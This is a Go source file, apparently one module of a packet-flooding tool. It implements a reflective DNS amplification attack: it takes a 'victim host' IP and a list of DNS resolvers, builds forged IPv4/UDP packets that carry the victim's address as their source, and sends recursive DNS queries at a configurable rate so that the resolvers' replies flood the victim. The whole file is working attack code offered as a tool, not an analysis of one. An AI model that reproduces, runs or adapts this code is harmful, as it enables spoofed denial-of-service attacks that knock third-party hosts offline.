package module

import (
	"os"
	"log"
	"net"
	"strings"
	"errors"
	"bufio"
	"math/rand"

	"cjr/protocol"
	flags "github.com/jessevdk/go-flags"
)

type RDNSOpt struct {
	BaseOption
	Target string `short:"t" long:"target" description:"ip address of victim host" value-name:"address" default:""`
	Dns []string `long:"dns" description:"ip address of dns reflective server" value-name:"host:port"`
	dest []net.IP
	port []uint16
	DnsFile func(string) `short:"f" long:"file" description:"dns server list file" value-name:"path" default:""`
	CountFunc func(int) `short:"c" long:"count" description:"stop after sending count packets" value-name:"count" default:"0"`
	RateFunc func(string) `short:"r" long:"rate" description:"send packets as a specific rate, such as 100/ms, 2/s, 100/min, the default is \"nolimit\"" value-name:"<speed>" default:"nolimit"`
	//TTL uint `short:"t" long:"ttl" description:"set TTL of IP packet" value-name:"ttl" default:"64"`
}

func (s RDNSOpt) IsBroadcast() bool {
	return false
}

func rdnsEntry(stopChan chan int, remainFlags []string) error {
	var opts RDNSOpt

	var err2 error

	opts.RateFunc = func(rate string) {
		e := commonRateFunc(&opts, rate)
		if e != nil { err2 = e }
	}
	opts.DnsFile = func(path string) {
		if len(path) == 0 {
			return
		}
		file, err := os.Open(path)
		if err != nil {
			err2 = err
			return
		}
		scanner := bufio.NewScanner(file)
		for scanner.Scan() {
			opts.Dns = append(opts.Dns, scanner.Text())
		}
		if err := scanner.Err(); err != nil {
			err2 = err
		}
	}
	opts.CountFunc = func(count int) {
		e := commonCountFunc(&opts, count)
		if e != nil { err2 = e }
	}

	//fmt.Println(remainFlags)
	cmd := flags.NewParser(&opts, flags.HelpFlag | flags.PrintErrors)

	_, err := cmd.ParseArgs(remainFlags)
	if err != nil {
		return err
	}

	if len(remainFlags) == 0 {
		cmd.WriteHelp(os.Stderr)
	}
	for _, flag := range remainFlags {
		if flag == "help" {
			cmd.WriteHelp(os.Stderr)
			return nil
		}
	}

	if err2 != nil { return err2 }

	if len(opts.Target) == 0 {
		return errors.New("no target IP specified")
	}
	opts.dest = make([]net.IP, 0)
	opts.port = make([]uint16, 0)
	for _, d := range opts.Dns {
		d = strings.TrimSpace(d)
		ipPort := strings.Split(d, ":")
		if len(ipPort) == 1 {
			opts.dest = append(opts.dest,  net.ParseIP(ipPort[0]))
			opts.port = append(opts.port, uint16(53))
		} else if len(ipPort) == 2 {
			var tmp_port uint16
			tmp_dest := net.ParseIP(ipPort[0])
			tmp_port, err = parsePort(ipPort[1])
			if err != nil {
				log.Println("invalid dns server:", err, d)
			} else {
				opts.dest = append(opts.dest, tmp_dest)
				opts.port = append(opts.port, tmp_port)
			}
		} else {
			log.Println("invalid dns server")
		}
	}

	return packetSend(stopChan, rdnsBuild, &opts)
}

var curServer int

func rdnsBuild(opts_ CommonOption) []protocol.Layer {
	opts := opts_.(*RDNSOpt)
	srcip := net.ParseIP(opts.Target)
	defer func() {
		curServer++
		if curServer >= len(opts.dest) {
			curServer -= len(opts.dest)
		}
	}()
	dstip := opts.dest[curServer]
	dstport := opts.port[curServer]
	// rfc 1035
	dns := &protocol.DNS {
		ID: uint16(rand.Intn(0x10000)),
		QR: 0, // query
		Opcode: 0, // standard query
		AA: 0,
		TC: 0,
		RD: 1, // Do query recursively
		RA: 0,
		Z: 0,
		RCODE: 0,
		QDCOUNT: 1,
		ANCOUNT: 0,
		NSCOUNT: 0,
		ARCOUNT: 0,
		Question: protocol.DNSQuestion {
			QNAME: []byte("www.baidu.com"),
			QTYPE: 0x1, // Type A
			QCLASS: 0x1, // IN
		},
	}

	pseudoHeader := make([]byte, 12, 12)
	copy(pseudoHeader[0:4], srcip.To4())
	copy(pseudoHeader[4:8], dstip.To4())
	udp := &protocol.UDP {
		PseudoHeader: pseudoHeader,
		SrcPort: uint16(rand.Intn(0xffff) + 1),
		DstPort: dstport,
	}

	ip4 := &protocol.IPv4Packet {
		Version: 4,
		IHL: 5,
		DSCP: 0,
		ECN: 0, // TODO just see what will happen
		ID: uint16(rand.Intn(0xffff)),
		DF: true,
		MF: false,
		FragmentOffset: 0,
		TTL: uint8(64),
		Protocol: protocol.IPP_UDP,
		SrcIP: srcip,
		DstIP: dstip,
	}
	return []protocol.Layer{ip4, udp, dns}
}

